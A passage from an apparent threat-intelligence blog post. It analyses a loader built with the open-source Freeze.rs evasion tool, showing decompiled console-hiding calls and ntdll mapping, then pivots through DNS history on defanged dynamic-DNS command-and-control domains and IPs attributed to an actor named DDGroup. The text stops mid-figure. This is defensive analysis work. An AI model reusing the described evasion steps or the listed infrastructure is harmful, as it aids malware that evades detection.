pd mp mq mr pe mt mu mv pf mx my mz pg nb nc nd oz pa pb bk">The target process is created with the CREATE_SUSPENDED flag (0x4)</li><li id="cfc5" class="mg mh gu mi b mj pc ml mm mn pd mp mq mr pe mt mu mv pf mx my mz pg nb nc nd oz pa pb bk">At the beginning of the main function in the code (virtual address 0x1800011c0 in the sample with Sha-256: afd38445e5249ac5ac66addd18c20d271f41c3ffb056ca49c8c02f9fecb4afcb), there are the following three calls to the Win32 API, which attempt to hide the console window:</li></ol><pre class="ol om on oo op oq or os bp ot bb bk"><span id="e1dc" class="ou nn gu or b bg ov ow l ox oy">1800011e6      HWND hWnd = GetConsoleWindow();<br/>1800011f3      ShowWindow(hWnd, SW_HIDE);<br/>1800011f8      int32_t lpEnvironment = 3;<br/>180001220      SetWindowPos(hWnd, -2, 0, 0, 0, 0, 0x3); // HWND_NOTOPMOST = -2</span></pre><p id="af84" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">This exactly matches the code in the hide function in Freeze.rs: <a class="af ok" href="https://github.com/optiv/Freeze.rs/blob/52f0bc0f301182c9d18afd89bfda1d69e2cef31b/lib/src/lib.rs#L142C1-L142C1" rel="noopener ugc nofollow" target="_blank">https://github.com/optiv/Freeze.rs/blob/52f0bc0f301182c9d18afd89bfda1d69e2cef31b/lib/src/lib.rs#L142C1-L142C1</a>.</p><p id="1cc9" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">Note that the proper way to hide the console Window for Rust applications is by using the #![windows_subsystem = “windows”] attribute in your program — I am not sure why they did it this way, as these function calls are pretty distinctive for detection.</p><p id="14c0" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">4. At 0x1800014a3, they call a function (at 0x1800036b0 ) which maps in C:\Windows\System32\ntdll.dll via calling CreateFileMappingW, MapViewOfFile. They parse the PE headers and specifically look for the address of the .text section; they look for both the string .text and the string REASON in there. This matches the code in these places exactly: <a class="af ok" href="https://github.com/optiv/Freeze.rs/blob/52f0bc0f301182c9d18afd89bfda1d69e2cef31b/lib/src/lib.rs#L171" rel="noopener ugc nofollow" target="_blank">https://github.com/optiv/Freeze.rs/blob/52f0bc0f301182c9d18afd89bfda1d69e2cef31b/lib/src/lib.rs#L171</a>, <a class="af ok" href="https://github.com/optiv/Freeze.rs/blob/52f0bc0f301182c9d18afd89bfda1d69e2cef31b/lib/src/lib.rs#L208" rel="noopener ugc nofollow" target="_blank">https://github.com/optiv/Freeze.rs/blob/52f0bc0f301182c9d18afd89bfda1d69e2cef31b/lib/src/lib.rs#L208</a></p><p id="6abd" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">5. A weird cryptographic mistake was observed, in which a Base64 encoded “IV” value is defined for the RC4 algorithm. RC4 does not make use of an IV. This matches: <a class="af ok" href="https://github.com/optiv/Freeze.rs/blob/52f0bc0f301182c9d18afd89bfda1d69e2cef31b/lib/src/lib.rs#L375" rel="noopener ugc nofollow" target="_blank">https://github.com/optiv/Freeze.rs/blob/52f0bc0f301182c9d18afd89bfda1d69e2cef31b/lib/src/lib.rs#L375</a></p><p id="da02" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">In regards to the observed unidentified pdb path, cxiao actually pointed out a solution I had not thought about before:</p><blockquote class="qn qo qp"><p id="4acd" class="mg mh qq mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">For the PDB path we see (C:\\Users\\Administrator\\Desktop\\crock\\target\\release\\deps\\crock.pdb) — when generating payloads with Freeze.rs, the user is able to specify what the output name they want is (e.g. crock.exe, crock.dll). Freeze.rs then creates a generated folder with the first part of that name (e.g. crock), writes the generated Rust build files and source files into that folder, then does a build of a new Rust binary from that folder: <a class="af ok" href="https://github.com/optiv/Freeze.rs/blob/52f0bc0f301182c9d18afd89bfda1d69e2cef31b/src/main.rs#L133" rel="noopener ugc nofollow" target="_blank">https://github.com/optiv/Freeze.rs/blob/52f0bc0f301182c9d18afd89bfda1d69e2cef31b/src/main.rs#L133</a><br/>This will result in, by default, a PDB path which has the name of the generated project (crock.pdb)</p></blockquote><p id="f3a3" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">So once again we observed our actor making use of open-source tooling to prepare their attacks.</p></div></div></div><div class="ab cb ne nf ng nh" role="separator"><span class="ni by bm nj nk nl"></span><span class="ni by bm nj nk nl"></span><span class="ni by bm nj nk"></span></div><div class="gn go gp gq gr"><div class="ab cb"><div class="ci bh fz ga gb gc"><h2 id="9f8c" class="nm nn gu bf no np nq dy nr ns nt ea nu mr nv nw nx mv ny nz oa mz ob oc od oe bk"><strong class="al">Chapter 5: The same actor — over and over again</strong></h2><p id="8fd1" class="pw-post-body-paragraph mg mh gu mi b mj of ml mm mn og mp mq mr oh mt mu mv oi mx my mz oj nb nc nd gn bk">Now, let us get to the part where things get really interesting which is also why I decided to give the actor a name and dedicate this whole blog post to their activities.</p><p id="8eeb" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">When I normally see an actor making use of dynamic DNS services for C2 connections, paired with open-source tooling, I am mostly convinced to be looking at a non-sophisticated actor. And on this occasion, it seems that this is how a rather big fish was able to evade public attention for a long time.</p><p id="c2f8" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">Let us have a look at the previously discovered C2 servers:</p><ul class=""><li id="d20a" class="mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd qb pa pb bk">secoundxwormm.ddns[.]net</li><li id="adac" class="mg mh gu mi b mj pc ml mm mn pd mp mq mr pe mt mu mv pf mx my mz pg nb nc nd qb pa pb bk">freshinxworm.ddns[.]net</li><li id="9bec" class="mg mh gu mi b mj pc ml mm mn pd mp mq mr pe mt mu mv pf mx my mz pg nb nc nd qb pa pb bk">Darwin090.gleeze[.]com</li><li id="9b03" class="mg mh gu mi b mj pc ml mm mn pd mp mq mr pe mt mu mv pf mx my mz pg nb nc nd qb pa pb bk">randall010.camdvr[.]org</li></ul><p id="ecd9" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">As we all know, domains usually point at IP addresses using the DNS protocol. And this is not different with dynamic DNS domains. Luckily, I have access to a great tool for DNS history data called <a class="af ok" href="https://axonintel.validin.com/" rel="noopener ugc nofollow" target="_blank">Axon Intel</a> by Validin LLC (*). Together with other known search tools like <a class="af ok" href="https://otx.alienvault.com/browse/global/pulses?include_inactive=0&amp;sort=-modified&amp;page=1&amp;limit=10" rel="noopener ugc nofollow" target="_blank">OTX Alienvault</a> and VirusTotal, it is not difficult to get a history of IP addresses associated with the above C2 domains.</p><p id="b08e" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">Let us start with secoundxwormm.ddns[.]net. Using AxonIntel we can quickly determine that the domain previously pointed at IP: <a class="af ok" href="https://axonintel.validin.com/axon?find=154.53.51.233&amp;type=ip4" rel="noopener ugc nofollow" target="_blank">154.53.51.233</a></p><p id="8f3f" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">Here is a screenshot of the history of that IP:</p><figure class="ol om on oo op pk ph pi paragraph-image"><div role="button" tabindex="0" class="pl pm fj pn bh po"><div class="ph pi qr"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*-CjX3JQHm7oLQoUTwB4g_A.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*-CjX3JQHm7oLQoUTwB4g_A.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*-CjX3JQHm7oLQoUTwB4g_A.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*-CjX3JQHm7oLQoUTwB4g_A.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*-CjX3JQHm7oLQoUTwB4g_A.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*-CjX3JQHm7oLQoUTwB4g_A.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-CjX3JQHm7oLQoUTwB4g_A.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*-CjX3JQHm7oLQoUTwB4g_A.png 640w, https://miro.medium.com/v2/resize:fit:720/1*-CjX3JQHm7oLQoUTwB4g_A.png 720w, https://miro.medium.com/v2/resize:fit:750/1*-CjX3JQHm7oLQoUTwB4g_A.png 750w, https://miro.medium.com/v2/resize:fit:786/1*-CjX3JQHm7oLQoUTwB4g_A.png 786w, https://miro.medium.com/v2/resize:fit:828/1*-CjX3JQHm7oLQoUTwB4g_A.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*-CjX3JQHm7oLQoUTwB4g_A.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*-CjX3JQHm7oLQoUTwB4g_A.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh ln pp c" width="700" height="491" loading="lazy" role="presentation"/></picture></div></div><figcaption class="pq ff pr ph pi ps pt bf b bg z du">Figure 9: AxonIntel DNS history for 154.53.51.233</figcaption></figure><p id="8c99" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">Noticed something? There is two other dynamic DNS domain that pointed at this IP for the same timeframe, one of them we have seen before: freshinxworm.ddns[.]net and one is new: quasharr.ddns[.]net</p><p id="a643" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">Let&#x27;s have a look at quasharr.ddns[.]net it in VirusTotal:</p><figure class="ol om on oo op pk ph pi paragraph-image"><div role="button" tabindex="0" class="pl pm fj pn bh po"><div class="ph pi qs"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*L_8s891ykJytHKCSeccfuw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*L_8s891ykJytHKCSeccfuw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*L_8s891ykJytHKCSeccfuw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*L_8s891ykJytHKCSeccfuw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*L_8s891ykJytHKCSeccfuw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*L_8s891ykJytHKCSeccfuw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*L_8s891ykJytHKCSeccfuw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*L_8s891ykJytHKCSeccfuw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*L_8s891ykJytHKCSeccfuw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*L_8s891ykJytHKCSeccfuw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*L_8s891ykJytHKCSeccfuw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*L_8s891ykJytHKCSeccfuw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*L_8s891ykJytHKCSeccfuw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*L_8s891ykJytHKCSeccfuw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh ln pp c" width="700" height="296" loading="lazy" role="presentation"/></picture></div></div></figure><p id="a482" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">As you can see, there is some evil associated. “invoice.bat” even fits the Invoice-themed lures observed for the other C2s. Interesting, was that a lucky hit? Let&#x27;s try with freshinxworm.ddns[.]net.</p><figure class="ol om on oo op pk ph pi paragraph-image"><div role="button" tabindex="0" class="pl pm fj pn bh po"><div class="ph pi qt"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*l41QdY918meFMiCt1fLatA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*l41QdY918meFMiCt1fLatA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*l41QdY918meFMiCt1fLatA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*l41QdY918meFMiCt1fLatA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*l41QdY918meFMiCt1fLatA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*l41QdY918meFMiCt1fLatA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*l41QdY918meFMiCt1fLatA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*l41QdY918meFMiCt1fLatA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*l41QdY918meFMiCt1fLatA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*l41QdY918meFMiCt1fLatA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*l41QdY918meFMiCt1fLatA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*l41QdY918meFMiCt1fLatA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*l41QdY918meFMiCt1fLatA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*l41QdY918meFMiCt1fLatA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh ln pp c" width="700" height="278" loading="lazy" role="presentation"/></picture></div></div><figcaption class="pq ff pr ph pi ps pt bf b bg z du">Figure 10: AxonIntel DNS history for freshinxworm.ddns[.]net</figcaption></figure><p id="11c1" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">As you can see, the domain has been pointing to 3 different IPs in the timeframe of one month. It is likely the same actor. Let&#x27;s have a look at the IPs:<a class="af ok" href="https://axonintel.validin.com/axon?find=89.117.72.232&amp;type=ip4" rel="noopener ugc nofollow" target="_blank"><br/>89.117.72.232</a> and <a class="af ok" href="https://axonintel.validin.com/axon?find=154.12.233.76&amp;type=ip4" rel="noopener ugc nofollow" target="_blank">154.12.233.76</a></p><figure class="ol om on oo op pk ph pi paragraph-image"><div role="button" tabindex="0" class="pl pm fj pn bh po"><div class="ph pi qu"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*fZQNKSugzAPMHwngXkxjWA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*fZQNKSugzAPMHwngXkxjWA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*fZQNKSugzAPMHwngXkxjWA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*fZQNKSugzAPMHwngXkxjWA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*fZQNKSugzAPMHwngXkxjWA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*fZQNKSugzAPMHwngXkxjWA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fZQNKSugzAPMHwngXkxjWA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*fZQNKSugzAPMHwngXkxjWA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*fZQNKSugzAPMHwngXkxjWA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*fZQNKSugzAPMHwngXkxjWA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*fZQNKSugzAPMHwngXkxjWA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*fZQNKSugzAPMHwngXkxjWA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*fZQNKSugzAPMHwngXkxjWA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*fZQNKSugzAPMHwngXkxjWA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh ln pp c" width="700" height="337" loading="lazy" role="presentation"/></picture></div></div><figcaption class="pq ff pr ph pi ps pt bf b bg z du">Figure 11: AxonIntel DNS history for 89.117.72.232</figcaption></figure><figure class="ol om on oo op pk ph pi paragraph-image"><div role="button" tabindex="0" class="pl pm fj pn bh po"><div class="ph pi qv"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*w1eh5pwEx5rtIenpqKPuqA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*w1eh5pwEx5rtIenpqKPuqA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*w1eh5pwEx5rtIenpqKPuqA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*w1eh5pwEx5rtIenpqKPuqA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*w1eh5pwEx5rtIenpqKPuqA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*w1eh5pwEx5rtIenpqKPuqA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*w1eh5pwEx5rtIenpqKPuqA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*w1eh5pwEx5rtIenpqKPuqA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*w1eh5pwEx5rtIenpqKPuqA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*w1eh5pwEx5rtIenpqKPuqA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*w1eh5pwEx5rtIenpqKPuqA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*w1eh5pwEx5rtIenpqKPuqA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*w1eh5pwEx5rtIenpqKPuqA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*w1eh5pwEx5rtIenpqKPuqA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh ln pp c" width="700" height="253" loading="lazy" role="presentation"/></picture></div></div><figcaption class="pq ff pr ph pi ps pt bf b bg z du">Figure 12: AxonIntel DNS history for 154.12.233.76</figcaption></figure><p id="2771" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">Well, at this point I think we can all agree that quasharr.ddns[.]net is also linked to DDGroup. <br/>Let us have a look at this newfound domain in AxonIntel:</p><figure class="ol om on oo op pk ph pi paragraph-image"><div role="button" tabindex="0" class="pl pm fj pn bh po"><div class="ph pi qw"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*oW515hg0ztbTSoH_00n1xA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*oW515hg0ztbTSoH_00n1xA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*oW515hg0ztbTSoH_00n1xA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*oW515hg0ztbTSoH_00n1xA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*oW515hg0ztbTSoH_00n1xA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*oW515hg0ztbTSoH_00n1xA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*oW515hg0ztbTSoH_00n1xA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*oW515hg0ztbTSoH_00n1xA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*oW515hg0ztbTSoH_00n1xA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*oW515hg0ztbTSoH_00n1xA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*oW515hg0ztbTSoH_00n1xA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*oW515hg0ztbTSoH_00n1xA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*oW515hg0ztbTSoH_00n1xA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*oW515hg0ztbTSoH_00n1xA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh ln pp c" width="700" height="454" loading="lazy" role="presentation"/></picture></div></div><figcaption class="pq ff pr ph pi ps pt bf b bg z du">Figure 13: AxonIntel DNS history for quasharr.ddns[.]net</figcaption></figure><p id="313b" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">As you can see, this domain was very busy. Let&#x27;s have a look at one of the more interesting IPs:</p><figure class="ol om on oo op pk ph pi paragraph-image"><div role="button" tabindex="0" class="pl pm fj pn bh po"><div class="ph pi qx"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*XjlLxhV_Doypvm84MigwBw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*XjlLxhV_Doypvm84MigwBw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*XjlLxhV_Doypvm84MigwBw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*XjlLxhV_Doypvm84MigwBw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*XjlLxhV_Doypvm84MigwBw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*XjlLxhV_Doypvm84MigwBw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XjlLxhV_Doypvm84MigwBw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*XjlLxhV_Doypvm84MigwBw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*XjlLxhV_Doypvm84MigwBw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*XjlLxhV_Doypvm84MigwBw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*XjlLxhV_Doypvm84MigwBw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*XjlLxhV_Doypvm84MigwBw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*XjlLxhV_Doypvm84MigwBw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*XjlLxhV_Doypvm84MigwBw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh ln pp c" width="700" height="344" loading="lazy" role="presentation"/></picture></div></div><figcaption 